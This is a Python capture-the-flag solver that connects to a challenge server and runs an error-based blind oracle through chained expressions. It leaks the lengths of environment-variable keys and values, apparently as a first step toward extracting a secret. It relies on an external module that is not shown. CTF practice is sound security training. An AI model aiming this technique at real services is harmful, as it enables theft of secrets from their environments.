import socket
import json
import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

class PersistentConnection:
    def __init__(self, host="challs.pyjail.club", port=20219, timeout=15):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.settimeout(timeout)
        self.buffer = b""
        self._consume_initial_prompt()

    def _consume_initial_prompt(self):
        while b"expr: " not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("remote closed before initial prompt")
            self.buffer += chunk
        self.buffer = self.buffer.split(b"expr: ", 1)[1]

    def query(self, expr):
        self.sock.sendall((expr + "\n").encode())
        token_re = solve_remote_live.TOKEN_RE
        while True:
            m = token_re.search(self.buffer)
            if m:
                res = m.group(1).decode()
                self.buffer = self.buffer[m.end():]
                return res
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("remote closed connection during query")
            self.buffer += chunk

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

def main():
    conn = PersistentConnection()
    print("[+] Connected to remote server successfully!")

    # 1. Test key length for first key: env|keys|first|length
    print("\n[*] Finding length of first key (env|keys|first|length)...")
    first_key_len = None
    for n in sorted(CHAINS.keys()):
        if n > 50: break
        pred = predicate(CHAINS[n])
        res = conn.query(f"env|keys|first|length|{pred}|error")
        if res == "error":
            first_key_len = n
            print(f"[+] FIRST KEY LENGTH = {n}")
            break

    # 2. Test key length for last key: env|keys|last|length
    print("\n[*] Finding length of last key (env|keys|last|length)...")
    last_key_len = None
    for n in sorted(CHAINS.keys()):
        if n > 50: break
        pred = predicate(CHAINS[n])
        res = conn.query(f"env|keys|last|length|{pred}|error")
        if res == "error":
            last_key_len = n
            print(f"[+] LAST KEY LENGTH = {n}")
            break

    # 3. Test value length of first string in env|flatten: env|flatten|sort|first|length
    print("\n[*] Finding length of first string in env|flatten (env|flatten|sort|first|length)...")
    first_val_len = None
    for n in sorted(CHAINS.keys()):
        if n > 250: break
        pred = predicate(CHAINS[n])
        res = conn.query(f"env|flatten|sort|first|length|{pred}|error")
        if res == "error":
            first_val_len = n
            print(f"[+] FIRST STRING VALUE LENGTH = {n}")
            break

    # 4. Test value length of last string in env|flatten: env|flatten|sort|last|length
    print("\n[*] Finding length of last string in env|flatten (env|flatten|sort|last|length)...")
    last_val_len = None
    for n in sorted(CHAINS.keys()):
        if n > 250: break
        pred = predicate(CHAINS[n])
        res = conn.query(f"env|flatten|sort|last|length|{pred}|error")
        if res == "error":
            last_val_len = n
            print(f"[+] LAST STRING VALUE LENGTH = {n}")
            break

    conn.close()

if __name__ == "__main__":
    main()
